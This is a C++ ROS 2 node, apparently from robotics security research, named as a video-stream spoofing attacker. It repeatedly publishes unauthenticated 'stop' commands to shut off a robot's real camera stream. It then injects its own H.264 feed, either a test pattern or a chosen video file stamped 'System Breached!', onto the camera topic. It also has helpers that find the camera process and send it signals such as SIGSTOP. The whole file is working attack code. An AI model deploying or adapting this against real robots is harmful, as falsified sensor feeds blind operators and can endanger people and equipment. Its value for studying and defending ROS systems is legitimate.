#include <memory>
#include <thread>
#include <iostream>
#include <chrono>
#include <stdio.h>
#include <stdlib.h>
#include <algorithm>
#include <string>
#include <cctype>
#include <arpa/inet.h>

#include <sys/types.h>
#include <signal.h>

#include <gst/gst.h>
#include <gst/gstbus.h>
#include <gst/gstpipeline.h>
#include <gst/gstelement.h>
#include <gst/gstcaps.h>
#include <gst/app/gstappsink.h>

#include <nlohmann/json.hpp>


#include "rclcpp/rclcpp.hpp"
#include "rcl_interfaces/msg/parameter_descriptor.hpp"
#include <sensor_msgs/msg/compressed_image.hpp>
#include <sensor_msgs/msg/image.hpp>
#include "std_msgs/msg/string.hpp"

using std::placeholders::_1;

namespace
{
  volatile bool gTerminate;
}

using namespace std::chrono_literals;
#define LEN 10
class VideoSpoofingNode : public rclcpp::Node
{
public:
  VideoSpoofingNode()
  : Node("video_stream_spoofing_attacker"),
    pipeline_(nullptr), source_(nullptr), sink_(nullptr),
    bus_(nullptr), cnt_(0)
  {
    const std::string ns = std::string(this->get_namespace());
    publisher_ = this->create_publisher<sensor_msgs::msg::CompressedImage>(
      ns + "/camera/color/video",
      rclcpp::SystemDefaultsQoS());

    camera_cmd_publisher_ = this->create_publisher<std_msgs::msg::String>(
      ns + "/camera/videostreamcmd",
      rclcpp::QoS(10).reliable());

    gstreamer_cmd_publisher_ = this->create_publisher<std_msgs::msg::String>(
      ns + "/gstreamer/videostreamcmd",
      rclcpp::SystemDefaultsQoS());
    eos_ = false;
    this->declare_parameter("video_file", rclcpp::ParameterValue(""));
    video_file_ = this->get_parameter("video_file").as_string();
    killCameraNode();
    send_stop_cmd_timer_ = this->create_wall_timer(
      std::chrono::milliseconds(200),
      std::bind(&VideoSpoofingNode::killCameraNode, this));
    // for (int i = 0; i < 5; i++) {
      // killCameraNode();
    // }
    
    gst_init(nullptr, nullptr);
    initializeGst();
    send_start_cmd_timer_ = this->create_wall_timer(
      std::chrono::milliseconds(2500),
      std::bind(&VideoSpoofingNode::sendStartCommand, this));

  }

  ~VideoSpoofingNode()
  {
    // stopAttack();
  }

  void stopAttack(){
    if (!eos_){
      gst_element_set_state(pipeline_, GST_STATE_NULL);
    }
    gst_object_unref(pipeline_);
    gst_object_unref(bus_);
    RCLCPP_INFO(this->get_logger(), "Sending start command to camera (stop attack).");
    rclcpp::Rate r(5);
    for (int i = 0; i < 10; i++) {
      auto msg = std_msgs::msg::String();
      msg.data = "{ \"Command\": \"start\" }";
      camera_cmd_publisher_->publish(msg);
      r.sleep();
    }
    RCLCPP_INFO(this->get_logger(), "Attack finished and camera stream restarted.");
  }

  long getPidCameraNode()
  {
    char line[LEN];
    FILE * cmd = popen("pidof -s camera_node", "r");
    long pid = 0;
    fgets(line, LEN, cmd);
    pid = strtoul(line, NULL, 10);
    return pid;
  }


  int sendSignal(const int & pid, const int & sig)
  {
    if (pid == 0)
    {
      RCLCPP_INFO(this->get_logger(), "No camera node running");
      return -1;
    }
    int res = kill(pid, sig);
    std::string signalDescription = "";
    switch (sig) {
      case 2:
        signalDescription = "SIGINT";
        break;
      case 18:
        signalDescription = "SIGCONT";
        break;
      case 19:
        signalDescription = "SIGSTOP";
        break;
      default:
        signalDescription = "UNKNOWN";
        break;
    }
    if (res == 0) {
      RCLCPP_INFO(this->get_logger(), "Sent signal [%d] %s to pid %d", sig, signalDescription.c_str(), pid);
    } else {
      RCLCPP_INFO(this->get_logger(), "Failed to send signal [%d] %s to pid %d", sig, signalDescription.c_str(), pid);
    }
    return res;
  }

private:

  void killCameraNode()
  {
    RCLCPP_INFO(this->get_logger(), "Sending stop stream command to camera nodes.");
    auto msg = std_msgs::msg::String();

    msg.data = "{ \"Command\": \"stop\" }";
    camera_cmd_publisher_->publish(msg);
    // auto msg_gstreamer = std_msgs::msg::String();
    // msg_gstreamer.data = "{ \"Command\": \"stop\" }";
    // gstreamer_cmd_publisher_->publish(msg_gstreamer);

    RCLCPP_INFO(this->get_logger(), "Sent stop stream command, waiting 0.2 seconds");
    if (cnt_ < 10){
      cnt_ += 1;
    } else {
      send_stop_cmd_timer_->cancel();
    }
  }

  void sendStartCommand()
  {

    RCLCPP_INFO(this->get_logger(), "Sending start stream command");
    auto msg = std_msgs::msg::String();
    msg.data = "{ \"Command\": \"start\" }";
    gstreamer_cmd_publisher_->publish(msg);
    RCLCPP_INFO(this->get_logger(), "Sent start stream command");
    

    const GstStateChangeReturn result = gst_element_set_state(pipeline_, GST_STATE_PLAYING);

    if (result == GST_STATE_CHANGE_ASYNC) {
      // here will be a debug point in the future
      RCLCPP_INFO(get_logger(), "success to set pipeline state to PLAYING");
    } else if (result != GST_STATE_CHANGE_SUCCESS) {
      RCLCPP_ERROR(get_logger(), "failed to set pipeline state to PLAYING (error %u)", result);
    }
    send_start_cmd_timer_->cancel();
  }

  bool initializeGst()
  {
    RCLCPP_INFO(this->get_logger(), "Initializing Gst");
    GError * err = NULL;

   std::string gst_launch;
    if (video_file_.empty()){

      gst_launch = "videotestsrc pattern=smpte is-live=true ! video/x-raw,format=I420,width=1280,height=720,framerate=25/1 \
                  ! identity name=post-src ! textoverlay text=\"System Breached!\" valignment=4 halignment=1 font-desc=Sans \
                  ! identity name=pre-x264enc ! queue ! x264enc tune=fastdecode bitrate=5000 speed-preset=superfast rc-lookahead=5 \
                  ! video/x-h264, stream-format=byte-stream, profile=baseline \
                  ! identity name=pre-appsink ! appsink name=mysink emit-signals=true  \
                  ";
    } else {
      gst_launch = "filesrc location=" + video_file_ + " \
                  ! decodebin name=dec ! videoconvert \
                  ! identity name=post-src ! textoverlay text=\"System Breached!\" valignment=4 halignment=1 font-desc=Sans \
                  ! identity name=pre-x264enc ! queue ! x264enc tune=fastdecode bitrate=5000 speed-preset=superfast rc-lookahead=5 \
                  ! video/x-h264, stream-format=byte-stream, profile=baseline \
                  ! identity name=pre-appsink ! appsink name=mysink emit-signals=true  \
                  ";
    }
    

    pipeline_ = gst_parse_launch(gst_launch.c_str(), &err);

    if (err != NULL) {
      RCLCPP_ERROR(this->get_logger(), "failed to create pipeline : (%s)", err->message);
      g_error_free(err);
      return false;
    }

    GstPipeline * pipeline = GST_PIPELINE(pipeline_);

    bus_ = gst_pipeline_get_bus(pipeline);

    if (!bus_) {
      RCLCPP_ERROR(this->get_logger(), "failed to retrieve GstBus from pipeline");
      return false;
    }

    // Get the appsrc
    GstElement * appsinkElement = gst_bin_get_by_name(GST_BIN(pipeline), "mysink");
    GstAppSink * appsink = GST_APP_SINK(appsinkElement);

    if (!appsink) {
      RCLCPP_ERROR(this->get_logger(), "failed to retrieve AppSink element from pipeline");
      return false;
    }

    sink_ = appsink;

    GstAppSinkCallbacks cb;
    memset(&cb, 0, sizeof(GstAppSinkCallbacks));

    cb.eos = on_eos;
    cb.new_preroll = on_preroll;
    cb.new_sample = on_buffer;

    gst_app_sink_set_callbacks(sink_, &cb, (void *)this, NULL);

    return true;
  }
  static void on_eos(_GstAppSink * sink, void * user_data)
  {
    VideoSpoofingNode * node = (VideoSpoofingNode *)user_data;
    (void)sink;
    RCLCPP_INFO(node->get_logger(), "on_eos called");
    node->eos_ = true;
    raise(SIGINT);
  }

  static GstFlowReturn on_preroll(_GstAppSink * sink, void * user_data)
  {
    VideoSpoofingNode * node = (VideoSpoofingNode *)user_data;
    (void)sink;
    RCLCPP_INFO(node->get_logger(), "on_preroll called");

    GstSample * sample;
    g_signal_emit_by_name (sink, "pull-preroll", &sample, NULL);
    return GST_FLOW_OK;
  }

  static GstFlowReturn on_buffer(_GstAppSink * sink, void * user_data)
  {
    VideoSpoofingNode * node = (VideoSpoofingNode *)user_data;
    GstSample * sample;

    // RCLCPP_INFO(node->get_logger(), "on_buffer called");

    // Retrieve the buffer
    g_signal_emit_by_name(sink, "pull-sample", &sample);

    if (sample) {
      GstMapInfo info;
      GstBuffer * buffer = gst_sample_get_buffer(sample);

      gst_buffer_map(buffer, &info, GST_MAP_READ);

      if (info.data != NULL) {
        // GstSegment *seg = gst_sample_get_segment (sample);
        int width, height;
        GstStructure * str;

        GstCaps * caps = gst_sample_get_caps(sample);
        // Get a string containg the pixel format, width and height of the image
        str = gst_caps_get_structure(caps, 0);

        gst_structure_get_int(str, "width", &width);
        gst_structure_get_int(str, "height", &height);

        static int count = 0;
        // ### publish
        auto img = std::make_unique<sensor_msgs::msg::Image>();
        // The queue prevents sequential reading. So, the pts misbehaves as the timestamp is not monotonic.
        // So, dts is used for the stamp.

        // GstClockTime stamp = buffer->pts;
        GstClockTime pos = buffer->dts;
        // GstClockTime stamp = GST_BUFFER_TIMESTAMP(buffer);
        // pos = gst_segment_to_stream_time(seg, GST_FORMAT_TIME, pos);
        auto video_stream_chunk = std::make_unique<sensor_msgs::msg::CompressedImage>();
        video_stream_chunk->header.frame_id = "color_camera_frame";
        video_stream_chunk->header.stamp = rclcpp::Time(pos, RCL_STEADY_TIME);

        // Get data from the info, and copy it to the chunk
        video_stream_chunk->data.resize(info.size);
        memcpy(video_stream_chunk->data.data(), info.data, info.size);


        RCLCPP_INFO(
          node->get_logger(),
          "[#%4d], Frame stamp %d.%.9d, size %ld,",
          count++, video_stream_chunk->header.stamp.sec, video_stream_chunk->header.stamp.nanosec, info.size);

        node->publisher_->publish(std::move(video_stream_chunk));
        gst_buffer_unmap(buffer, &info);
      }
      gst_sample_unref(sample);

      return GST_FLOW_OK;
    }

    return GST_FLOW_ERROR;
  }

  //uint8_t data_;
  rclcpp::Publisher<sensor_msgs::msg::CompressedImage>::SharedPtr publisher_;
  rclcpp::Publisher<std_msgs::msg::String>::SharedPtr gstreamer_cmd_publisher_;
  rclcpp::Publisher<std_msgs::msg::String>::SharedPtr camera_cmd_publisher_;
  rclcpp::TimerBase::SharedPtr send_start_cmd_timer_, send_stop_cmd_timer_;

  rclcpp::TimerBase::SharedPtr key_listener_timer_;
  std::string video_file_;

  std::string gst_pipeline_string_;
  GstElement * pipeline_;
  GstElement * source_;
  GstAppSink * sink_;
  GstBus * bus_;
  bool eos_;
  //GMainLoop * loop_;
  size_t cnt_;
  rclcpp::CallbackGroup::SharedPtr key_listener_cb_;

};

std::shared_ptr<VideoSpoofingNode> node_;
void signal_handler(int signal)
{
    signal=signal;
    gTerminate = true;
    node_->stopAttack();
    rclcpp::shutdown();
}

int main(int argc, char * argv[])
{

  gTerminate = false;
  std::signal(SIGINT, signal_handler);
  std::signal(SIGTERM, signal_handler);

  rclcpp::init(argc, argv);
  node_ = std::make_shared<VideoSpoofingNode>();
  rclcpp::spin(node_);
  rclcpp::shutdown();
  return 0;
}
